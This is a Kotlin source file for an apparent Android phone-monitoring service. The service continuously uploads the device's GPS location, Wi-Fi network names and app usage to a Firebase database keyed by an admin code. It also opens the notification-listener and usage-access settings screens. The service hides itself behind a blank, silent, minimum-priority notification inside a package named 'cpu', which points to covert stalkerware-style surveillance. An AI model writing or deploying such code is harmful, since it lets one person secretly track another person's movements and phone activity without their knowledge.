package com.example.cpu

import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.net.wifi.WifiManager
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import androidx.core.app.NotificationCompat
import com.example.cpu.models.MonitoringData
import com.example.cpu.utils.PrefsManager
import com.google.android.gms.location.*
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import java.text.SimpleDateFormat
import java.util.*

class ClientMonitoringService : Service() {

    companion object {
        private const val CHANNEL_ID = "ClientMonitoring"
        private const val NOTIFICATION_ID = 1
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private lateinit var wifiManager: WifiManager
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var database: FirebaseDatabase
    private lateinit var storage: FirebaseStorage
    private lateinit var prefsManager: PrefsManager
    private lateinit var deviceStatusMonitor: DeviceStatusMonitor
    private lateinit var appUsageMonitor: AppUsageMonitor
    private val appUsageHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        prefsManager = PrefsManager(this)
        database = FirebaseDatabase.getInstance()
        storage = FirebaseStorage.getInstance()

        deviceStatusMonitor = DeviceStatusMonitor(this)
        deviceStatusMonitor.start()

        appUsageMonitor = AppUsageMonitor(this)
        startAppUsageTracking()

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        registerDevice()
        setupLocationTracking()
        startWifiMonitoring()
        checkPermissions()
    }

    private fun checkPermissions() {
        // Usage stats permission
        if (!appUsageMonitor.hasUsageStatsPermission()) {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }

        // Notification listener permission
        if (!isNotificationServiceEnabled()) {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val pkgName = packageName
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(pkgName)
    }

    private fun startAppUsageTracking() {
        val appUsageRunnable = object : Runnable {
            override fun run() {
                if (appUsageMonitor.hasUsageStatsPermission()) {
                    appUsageMonitor.collectAppUsage()
                }
                appUsageHandler.postDelayed(this, 3600000) // Every hour
            }
        }
        appUsageHandler.post(appUsageRunnable)
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Phone Monitoring",
            NotificationManager.IMPORTANCE_LOW
        ).apply { description = "Running in background" }
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
    }


    private fun registerDevice() {
        val adminCode = prefsManager.getAdminCode() ?: return
        val deviceId = prefsManager.getDeviceId() ?: return
        val deviceName = prefsManager.getDeviceName()

        val deviceInfo = mapOf(
            "id" to deviceId,
            "name" to deviceName,
            "lastSeen" to System.currentTimeMillis()
        )

        database.getReference("devices")
            .child(adminCode)
            .child(deviceId)
            .setValue(deviceInfo)
    }

    private fun setupLocationTracking() {
        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            300000
        ).build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.locations.forEach { saveLocation(it) }
            }
        }

        try {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
        } catch (e: SecurityException) {
            e.printStackTrace()
        }
    }

    private fun saveLocation(location: Location) {
        val adminCode = prefsManager.getAdminCode() ?: return
        val deviceId = prefsManager.getDeviceId() ?: return

        val data = MonitoringData(
            type = "location",
            latitude = location.latitude,
            longitude = location.longitude,
            timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()),
            deviceId = deviceId,
            deviceName = prefsManager.getDeviceName()
        )

        database.getReference("monitoring")
            .child(adminCode)
            .child(deviceId)
            .child("locations")
            .push()
            .setValue(data)
    }

    private fun startWifiMonitoring() {
        val wifiRunnable = object : Runnable {
            override fun run() {
                checkWifi()
                handler.postDelayed(this, 60000)
            }
        }
        handler.post(wifiRunnable)
    }

    private fun checkWifi() {
        val adminCode = prefsManager.getAdminCode() ?: return
        val deviceId = prefsManager.getDeviceId() ?: return

        val wifiInfo = wifiManager.connectionInfo
        val ssid = wifiInfo?.ssid?.replace("\"", "") ?: return

        if (ssid != "<unknown ssid>") {
            val data = MonitoringData(
                type = "wifi",
                wifiSsid = ssid,
                wifiBssid = wifiInfo.bssid ?: "",
                timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()),
                deviceId = deviceId,
                deviceName = prefsManager.getDeviceName()
            )

            database.getReference("monitoring")
                .child(adminCode)
                .child(deviceId)
                .child("wifi")
                .push()
                .setValue(data)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        super.onDestroy()
        fusedLocationClient.removeLocationUpdates(locationCallback)
        handler.removeCallbacksAndMessages(null)
        deviceStatusMonitor.stop()
        appUsageHandler.removeCallbacksAndMessages(null)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
